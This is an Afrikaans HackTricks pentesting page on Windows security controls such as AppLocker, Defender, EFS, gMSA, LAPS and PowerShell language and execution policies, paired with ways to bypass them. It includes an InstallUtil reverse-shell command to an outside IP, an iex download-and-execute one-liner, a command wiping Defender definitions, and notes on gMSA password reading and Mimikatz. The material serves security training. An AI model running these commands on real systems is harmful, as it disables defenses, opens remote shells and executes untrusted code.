# Windows-sekuriteitskontroles

{{#include ../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassingswitlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing te beskerm teen skadelike malware en ongemagtigde sagteware wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie aansluit nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **application whitelisting solution** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fynkorrelige beheer** oor uitvoerbare lêers, scripts, Windows-installeerderlêers, DLL's, verpakte toepassings en verpakte toepassingsinstalleerders.\
Dit is algemeen vir organisasies om **cmd.exe en PowerShell.exe te blokkeer** en skryftoegang tot sekere gidse te beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` evalueer kandidaat-lêers vir ’n spesifieke identiteit teen ’n AppLocker-beleid. Toets die rekening waarvan die token die payload sal uitvoer, omdat reëls gebruikers of groepe kan teiken; `Get-AppLockerFileInformation` is ook nuttig om die pad-, hash- en uitgewer-metadata te ondersoek waarteen reëls kan ooreenstem.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **Writable folders** om AppLocker Policy te bypass: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **writable folders** wat jy kan gebruik om dit te **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swak geskryfde reëls kan ook omseil word**
- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: jy kan enige plek ’n **folder genaamd `allowed`** skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die uitvoerbare lêer **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** te **blokkeer**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde geaktiveer weens die bykomende las wat dit op ’n stelsel kan plaas, asook die hoeveelheid testing wat nodig is om te verseker dat niks sal breek nie. Die gebruik van **DLLs as backdoors sal dus help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-code in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Plaaslike credentials is in hierdie lêer teenwoordig; die passwords is hashed.

### Local Security Authority (LSA) - LSASS

Die **credentials** (hashed) word vir Single Sign-On-doeleindes in die **memory** van hierdie subsystem **gestoor**.\
**LSA** administreer die plaaslike **security policy** (password policy, gebruikers se permissions...), **authentication**, **access tokens**...\
LSA sal die een wees wat die verskafde credentials in die **SAM**-lêer (vir ’n plaaslike login) **check**, en met die **domain controller** sal **communicate** om ’n domain user te authenticate.

Die **credentials** word binne die **LSASS-proses gestoor**: Kerberos tickets, NT- en LM-hashes, maklik decrypted passwords.

### LSA secrets

LSA kan sekere credentials op disk stoor:

- Password van die computer account van die Active Directory (onbereikbare domain controller).
- Passwords van die accounts van Windows-services
- Passwords vir scheduled tasks
- Meer (password van IIS-applications...)

### NTDS.dit

Dit is die database van die Active Directory. Dit is slegs in Domain Controllers teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n Antivirus wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **block** algemene pentesting-tools soos **`WinPEAS`**. Daar is egter maniere om hierdie **protections te omseil**.

### Check

Om die **status** van **Defender** te check, kan jy die PS cmdlet **`Get-MpComputerStatus`** uitvoer (check die waarde van **`RealTimeProtectionEnabled`** om te bepaal of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Geënkripteerde lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie te gebruik, met ’n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en binne die geënkripteerde lêer se $EFS **alternatiewe datastroom** gestoor. Wanneer dekripsie nodig is, word die ooreenstemmende **private sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te dekripteer. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Dekripsiescenario’s sonder gebruiker-inisiëring** sluit die volgende in:

- Wanneer lêers of vouers na ’n nie-EFS-lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie gedekripteer.

Hierdie enkripsiemetode laat **deursigtige toegang** tot geënkripteerde lêers vir die eienaar toe. Om bloot die eienaar se wagwoord te verander en aan te meld, sal egter nie dekripsie toelaat nie.

**Belangrikste punte**:

- EFS gebruik ’n simmetriese FEK wat met die gebruiker se publieke sleutel geënkripteer is.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder spesifieke toestande plaas, soos wanneer na FAT32 gekopieer word of tydens netwerktransmissie.
- Geënkripteerde lêers is vir die eienaar toeganklik sonder bykomende stappe.

### Gaan EFS-inligting na

Kontroleer of ’n **gebruiker** hierdie **diens** **gebruik** het deur te kontroleer of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** **toegang** tot die lêer het deur cipher /c \<file\> te gebruik\
Jy kan ook `cipher /e` en `cipher /d` binne ’n vouer gebruik om al die lêers te **enkripteer** en te **dekripteer**

### Dekripteer EFS-lêers

#### Om Authority System te wees

Hierdie benadering vereis dat die **slagoffer-gebruiker** ’n **proses** op die gasheer **laat loop**. Indien wel, kan jy vanuit ’n `meterpreter`-sessie die gebruiker se prosesteken (`impersonate_token` vanaf `incognito`) naboots. Alternatiewelik kan jy na die gebruiker se proses `migrate`.

#### Om die gebruiker se wagwoord te ken

Mimikatz kan die gebruiker se sertifikaat en private sleutel invoer en dit dan gebruik om EFS-beskermde lêers te dekripteer.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Groepbestuurde diensrekeninge (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die instelling "**Password never expire**" geaktiveer het, bied gMSA’s ’n veiliger en meer hanteerbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA’s gebruik ’n komplekse wagwoord van 240 karakters wat outomaties volgens domein- of rekenaarbeleid verander. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde sekuriteit**: Hierdie rekeninge is immuun teen lockouts en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir veelvuldige gashere**: gMSA’s kan oor veelvuldige gashere gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
- **Vermoë vir geskeduleerde take**: Anders as managed service accounts, ondersteun gMSA’s die uitvoering van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties by wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA’s word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) teruggestel. Hierdie wagwoord, ’n geënkripteerde datablob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA’s geïnstalleer is, verkry word, wat ’n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, word ’n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Jy kan hierdie wagwoord met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** lees.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om ’n **NTLM relay attack** uit te voer om die **password** van **gMSA** te **lees**.<sup>[[3]](#references)</sup>

## LAPS

Onderskei **legacy Microsoft LAPS** van die native **Windows LAPS**-implementering tydens enumeration. Windows LAPS is in die Windows-opdaterings van 11 April 2023 vrygestel en kan ’n bestuurde plaaslike administrateur-password na **Windows Server Active Directory** of **Microsoft Entra ID** rugsteun. In AD-gesteunde ontplooiings kan dit passwords ook enkripteer, geënkripteerde password-geskiedenis behou en ’n domeinbeheerder se DSRM-password bestuur. Die aflaaibare legacy MSI is op nuwer Windows-weergawes deprecated, hoewel Windows LAPS in legacy-emulation mode kan funksioneer.<sup>[[6]](#references)</sup>

Omdat legacy Microsoft LAPS en Windows LAPS afsonderlike implementerings is, bepaal watter een ontplooi is voordat attribute- of cmdlet-specific attacks toegepas word. Die gekoppelde bladsy dek discovery, ACL enumeration, retrieval, expiration manipulation en offline recovery, sonder om daardie prosedures hier te dupliseer.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die kenmerke af** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objects, die slegs-toelating van goedgekeurde .NET types, XAML-based workflows, PowerShell classes en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compileer, moet jy dalk** **'n** _**verwysing byvoeg**_ -> _Blaai_ ->_Blaai_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-uitvoeringsbeleid

By verstek is dit op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> gevind word

## Sekuriteitsondersteuningsverskaffer-koppelvlak (SSPI)

Is die API wat gebruik kan word om gebruikers te authenticate.

Die SSPI sal daarvoor verantwoordelik wees om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Die SSPI sal dan onderhandel oor watter authentication-protokol gebruik sal word. Hierdie authentication-protokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van ’n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Hoof-SSP's

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om versoenbaarheidsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webservers en LDAP, wagwoord in die vorm van ’n MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om te onderhandel oor die protokol wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek een)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een bied.

## UAC - Gebruikersrekeningbeheer

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n funksie wat ’n **toestemmingsversoek vir verhoogde aktiwiteite** moontlik maak.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Om AppLocker en PowerShell-beperkte taalmodus te omseil](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [hoe om EFS-lêers te dekripteer](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying vir gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maniere om die PowerShell-uitvoeringsbeleid te omseil](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Gebruik die AppLocker Windows PowerShell-cmdlets](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Oorsig van Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
